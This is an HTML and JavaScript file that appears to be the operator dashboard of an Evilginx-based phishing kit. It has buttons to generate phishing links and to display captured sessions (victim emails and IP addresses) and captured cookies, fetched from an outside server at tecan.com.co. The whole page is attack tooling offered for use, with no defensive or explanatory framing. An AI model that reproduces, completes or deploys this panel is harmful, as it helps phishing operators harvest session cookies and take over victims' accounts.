<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Evilginx</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #121212;
            color: white;
        }
        .menu {
            display: flex;
            justify-content: space-around;
            background: #6a11cb;
            padding: 10px;
        }
        .menu button {
            background: transparent;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        .content {
            padding: 20px;
        }
    </style>
</head>
<body>

<div class="menu">
    <button onclick="generateLink()">Generate Link</button>
    <button onclick="showSessions()">Captured Sessions</button>
    <button onclick="showCookies()">Cookies</button>
    <button onclick="logout()">Logout</button>
</div>

<div class="content" id="content-area">
    <h2>Welcome to the Dashboard</h2>
</div>

<script>
    function generateLink() {
        fetch("http://tecan.com.co/api/generate", { method: "POST" })
            .then(response => response.json())
            .then(data => {
                document.getElementById("content-area").innerHTML = "<p>Generated Link: " + data.link + "</p>";
            })
            .catch(error => console.error("Error:", error));
    }

    function showSessions() {
        fetch("http://tecan.com.co/api/sessions")
            .then(response => response.json())
            .then(data => {
                let content = "<h2>Captured Sessions</h2><ul>";
                data.sessions.forEach(session => {
                    content += `<li>${session.email} - ${session.ip}</li>`;
                });
                content += "</ul>";
                document.getElementById("content-area").innerHTML = content;
            })
            .catch(error => console.error("Error:", error));
    }

    function showCookies() {
        fetch("http://tecan.com.co/api/cookies")
            .then(response => response.json())
            .then(data => {
                let content = "<h2>Captured Cookies</h2><ul>";
                data.cookies.forEach(cookie => {
                    content += `<li>${cookie.name}: ${cookie.value}</li>`;
                });
                content += "</ul>";
                document.getElementById("content-area").innerHTML = content;
            })
            .catch(error => console.error("Error:", error));
    }

    function logout() {
        window.location.href = "index.html";
    }
</script>

</body>
</html>
